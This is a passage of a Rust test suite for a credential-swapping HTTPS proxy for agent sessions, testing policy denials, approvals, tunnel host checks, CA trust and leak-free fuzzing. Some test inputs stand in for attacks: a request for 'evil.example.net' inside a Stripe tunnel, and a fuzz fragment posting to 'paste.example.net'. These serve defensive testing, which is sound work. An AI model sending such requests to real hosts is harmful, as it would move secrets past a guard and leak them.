        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    let tls = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(STRIPE.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    let (mut s, c) = hyper::client::conn::http1::handshake(TokioIo::new(tls))
        .await
        .unwrap();
    tokio::spawn(c);
    let resp = s
        .send_request(get(false, STRIPE, h.up.port, "/big", &[]))
        .await
        .unwrap();
    let mut body = resp.into_body();
    let first = tokio::time::timeout(Duration::from_secs(5), body.frame())
        .await
        .expect("first chunk must arrive while upstream is paused")
        .unwrap()
        .unwrap()
        .into_data()
        .unwrap();
    assert!(first.starts_with(b"FIRST-CHUNK"));
    h.up.echo.gate.notify_one();
    let rest = body.collect().await.unwrap().to_bytes();
    assert_eq!(rest.len(), 64 * 64 * 1024);
}

// protects=AC10: Deny → 403 + Blocked receipt; NeedsApproval with no approver → 403 + Denied;
// with an approving FakeApprover → swap + Approved receipt carrying the token id;
// fails_when=a denied or unapproved request reaches upstream; no_claim=real Touch ID (L11)
#[tokio::test]
async fn policy_and_approvals() {
    let approval = ApprovalRequest {
        session: session(),
        key: KeyName::new("stripe/test").unwrap(),
        tier: Tier::Production,
        argv_display: vec![],
        argv_hash: [0; 32],
        cwd: "/".into(),
        effect: None,
    };
    let h = harness(Opts::default()).await;
    let req = || {
        get(
            false,
            STRIPE,
            h.up.port,
            "/",
            &[("authorization", "Bearer ms://stripe/test")],
        )
    };
    *h.policy.0.lock().unwrap() = Decision::Deny {
        reason: Reason::Stopped,
    };
    assert_eq!(https(&h, STRIPE, false, req()).await.status, 403);
    *h.policy.0.lock().unwrap() = Decision::NeedsApproval {
        request: approval.clone(),
    };
    assert_eq!(https(&h, STRIPE, false, req()).await.status, 403);
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);
    let results: Vec<_> = h.receipts.events().into_iter().map(|e| e.result).collect();
    assert_eq!(
        results,
        [
            ReceiptResult::Blocked(Reason::Stopped),
            ReceiptResult::Denied
        ]
    );

    let approver = Arc::new(FakeApprover::new([ApprovalOutcome::Approved(
        ApprovalToken {
            id: "tok-1".into(),
            mac: [1; 32],
            expires_unix_ms: u64::MAX,
        },
    )]));
    let h = harness(Opts {
        approver: Some(approver),
        ..Opts::default()
    })
    .await;
    *h.policy.0.lock().unwrap() = Decision::NeedsApproval { request: approval };
    let got = https(
        &h,
        STRIPE,
        false,
        get(
            false,
            STRIPE,
            h.up.port,
            "/",
            &[("authorization", "Bearer ms://stripe/test")],
        ),
    )
    .await;
    assert_eq!(got.status, 200, "{}", got.body);
    let ev = h.receipts.events();
    assert_eq!(ev[0].result, ReceiptResult::Approved);
    assert_eq!(ev[0].approval_id.as_deref(), Some("tok-1"));
}

// protects=AC11: no session for the peer means 403 and nothing forwarded; the proxy username is
// passed to the resolver; fails_when=an unknown peer gets a tunnel; no_claim=port→pid (L06)
#[tokio::test]
async fn no_session_refused() {
    let h = harness(Opts {
        session: None,
        ..Opts::default()
    })
    .await;
    let (code, msg, _) = connect(
        h.proxy,
        &format!("{STRIPE}:{}", h.up.port),
        "Proxy-Authorization: Basic Y2xhdWRlLWNvZGU6\r\n",
    )
    .await;
    assert_eq!(code, 403, "{msg}");
    assert!(msg.contains("not from a known agent session"), "{msg}");
    assert_eq!(
        h.sessions.1.lock().unwrap().clone(),
        [Some("claude-code".to_string())]
    );
    assert!(
        h.egress
            .0
            .lock()
            .unwrap()
            .iter()
            .any(|b| b.kind == BlockKind::NoSession)
    );
}

// protects=SNI must match the CONNECT host, and a request inside a tunnel must name the tunnel's
// host (421 otherwise); fails_when=a tunnel to api.stripe.com can carry a request for another
// host; no_claim=domain fronting through allowlisted (uninspected) tunnels
#[tokio::test]
async fn tunnel_host_must_match() {
    let h = harness(Opts::default()).await;
    let got = https(
        &h,
        STRIPE,
        false,
        get(
            false,
            "evil.example.net",
            h.up.port,
            "/",
            &[("authorization", "Bearer ms://stripe/test")],
        ),
    )
    .await;
    assert_eq!(got.status, StatusCode::MISDIRECTED_REQUEST, "{}", got.body);
    assert_eq!(h.up.echo.hits.load(Ordering::SeqCst), 0);

    let (code, _, tcp) = connect(h.proxy, &format!("{STRIPE}:{}", h.up.port), "").await;
    assert_eq!(code, 200);
    let mut roots = rustls::RootCertStore::empty();
    roots.add(h.ca.cert_der().clone()).unwrap();
    let cfg = rustls::ClientConfig::builder_with_provider(crate::tls::provider())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_root_certificates(roots)
        .with_no_client_auth();
    let r = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(MAPS.to_owned()).unwrap(), tcp)
        .await;
    assert!(r.is_err(), "SNI mismatch must abort the handshake");
}

// protects=AC12: Go's crypto/x509, which enforces name constraints strictly, accepts the chain
// the proxy presents and the swap works for a Go HTTP client; fails_when=Go rejects the
// name-constrained CA or leaf; no_claim=macOS system trust (manual test below). Skipped when
// `go` is not installed.
#[tokio::test]
async fn go_client_accepts_chain() {
    if std::process::Command::new("go")
        .arg("version")
        .output()
        .is_err()
    {
        // go is not installed: nothing to check.
        return;
    }
    let h = harness(Opts::default()).await;
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("ca.pem"), h.ca.cert_pem()).unwrap();
    std::fs::write(dir.path().join("main.go"), GO_CLIENT).unwrap();
    let out = tokio::process::Command::new("go")
        .args(["run", "main.go"])
        .current_dir(dir.path())
        .env("PROXY", format!("http://{}", h.proxy))
        .env(
            "TARGET",
            format!("https://{STRIPE}:{}/v1/charges", h.up.port),
        )
        .env("GOFLAGS", "-mod=mod")
        .env("GOTOOLCHAIN", "local")
        .output()
        .await
        .unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(out.status.success(), "go failed: {stdout}\n{stderr}");
    assert!(
        stdout.contains(&format!("authorization: Bearer {CANARY}")),
        "{stdout}"
    );
}

const GO_CLIENT: &str = r#"package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
)

func main() {
	pem, _ := os.ReadFile("ca.pem")
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		panic("bad ca")
	}
	p, _ := url.Parse(os.Getenv("PROXY"))
	c := &http.Client{Transport: &http.Transport{
		Proxy:           http.ProxyURL(p),
		TLSClientConfig: &tls.Config{RootCAs: pool},
	}}
	req, _ := http.NewRequest("GET", os.Getenv("TARGET"), nil)
	req.Header.Set("Authorization", "Bearer ms://stripe/test")
	resp, err := c.Do(req)
	if err != nil {
		panic(err)
	}
	b, _ := io.ReadAll(resp.Body)
	fmt.Println(resp.Status)
	fmt.Println(string(b))
}
"#;

// protects=the macOS system verifier trusts the morsec CA once it is in the login keychain (Go
// and the Stripe CLI ignore SSL_CERT_FILE on macOS); fails_when=a trusted CA is still rejected;
// no_claim=runs only by hand: adding trust settings needs a person to approve the prompt.
// Run: `cargo test -p ms-proxy keychain -- --ignored` after following the printed steps.
#[tokio::test]
#[ignore = "needs a person to add the CA to the login keychain"]
async fn keychain_trust_manual() {
    let h = harness(Opts::default()).await;
    let dir = std::env::temp_dir().join("morsec-keychain-test");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("ca.pem"), h.ca.cert_pem()).unwrap();
    std::fs::write(
        dir.join("main.go"),
        GO_CLIENT.replace(
            "TLSClientConfig: &tls.Config{RootCAs: pool},",
            "TLSClientConfig: &tls.Config{},\n\t\t_ = pool",
        ),
    )
    .unwrap();
    let hint = format!(
        "Trust it with: security add-trusted-cert -r trustRoot -k ~/Library/Keychains/login.keychain-db {}/ca.pem",
        dir.display()
    );
    // A fresh CA is generated per run, so this test can only pass when run interactively.
    let out = tokio::process::Command::new("go")
        .args(["run", "main.go"])
        .current_dir(&dir)
        .env("PROXY", format!("http://{}", h.proxy))
        .env("TARGET", format!("https://{STRIPE}:{}/", h.up.port))
        .output()
        .await
        .unwrap();
    assert!(
        out.status.success(),
        "{hint}\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn rt() -> &'static tokio::runtime::Runtime {
    static RT: std::sync::OnceLock<tokio::runtime::Runtime> = std::sync::OnceLock::new();
    RT.get_or_init(|| {
        tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap()
    })
}

fn fuzz_harness() -> &'static H {
    static H_: std::sync::OnceLock<H> = std::sync::OnceLock::new();
    H_.get_or_init(|| rt().block_on(harness(Opts::default())))
}

fn mutated_head() -> impl proptest::strategy::Strategy<Value = Vec<u8>> {
    use proptest::prelude::*;
    let pieces = prop_oneof![
        Just(b"CONNECT ".to_vec()),
        Just(b"GET ".to_vec()),
        Just(b"POST http://paste.example.net/ ".to_vec()),
        Just(b"api.stripe.com:443".to_vec()),
        Just(b"/p/stripe/x".to_vec()),
        Just(b" HTTP/1.1\r\n".to_vec()),
        Just(b"Host: api.stripe.com\r\n".to_vec()),
        Just(b"Authorization: Bearer ms://stripe/test\r\n".to_vec()),
        Just(b"Content-Length: 5\r\n".to_vec()),
        Just(b"Transfer-Encoding: chunked\r\n".to_vec()),
        Just(b"\r\n".to_vec()),
        prop::collection::vec(any::<u8>(), 0..24),
    ];
    prop::collection::vec(pieces, 0..12).prop_map(|v| v.concat())
}

proptest::proptest! {
    #![proptest_config(proptest::prelude::ProptestConfig::with_cases(96))]
    // protects=AC13: arbitrary bytes and mutated request heads never crash the listener and
    // never draw the canary into a response; fails_when=a response contains the value or the
    // proxy stops answering; no_claim=coverage-guided fuzzing (cargo-fuzz needs nightly; this
    // is a property test over the same entry point)
    #[test]
    fn fuzz_listener(input in mutated_head()) {
        let h = fuzz_harness();
        let resp = rt().block_on(async {
            let mut s = TcpStream::connect(h.proxy).await.unwrap();
            let _ = s.write_all(&input).await;
            let _ = s.shutdown().await;
            let mut out = Vec::new();
            let _ = tokio::time::timeout(Duration::from_secs(3), s.read_to_end(&mut out)).await;
            out
        });
        // The one legitimate way to see the value is the echo upstream reflecting a real
        // base-URL swap; anything else carrying it is a leak.
        let text = String::from_utf8_lossy(&resp);
        let legit = input.windows(10).any(|w| w == b"/p/stripe/")
            && input.windows(39).any(|w| w == b"Authorization: Bearer ms://stripe/test\r\n");
        proptest::prop_assert!(legit || !text.contains("CANARY"), "{}", text);
        let alive = rt().block_on(raw(h.proxy, b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"));
        proptest::prop_assert!(alive.starts_with("HTTP/1.1 400"), "{}", alive);
    }
}
